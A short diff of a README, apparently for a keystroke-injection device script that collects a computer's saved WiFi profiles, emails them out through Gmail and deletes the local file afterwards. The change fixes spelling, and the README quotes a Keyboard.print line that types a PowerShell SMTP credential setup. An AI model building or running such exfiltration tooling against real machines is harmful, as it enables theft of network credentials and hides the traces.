@@ -12,7 +12,7 @@ After the WIFI Profile contents is emailed the Profile.txt file is delted and th
 
 **Wifi Profile can only be sent via Gmail but can be received to any email.**  
 
-You will need to edit the feilds for Senders and recievers email creditals.
+You will need to edit the fields for Senders and receivers email credentials. .
 For Senders Email go to line 101 or find this line 
 
 <i><b> Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('CHANGE_THIS_GMAIL_ADDRESS@gmail.com', 'CHANGE_THIS_TO_GMAIL_PASSWORD')");</b></i> 
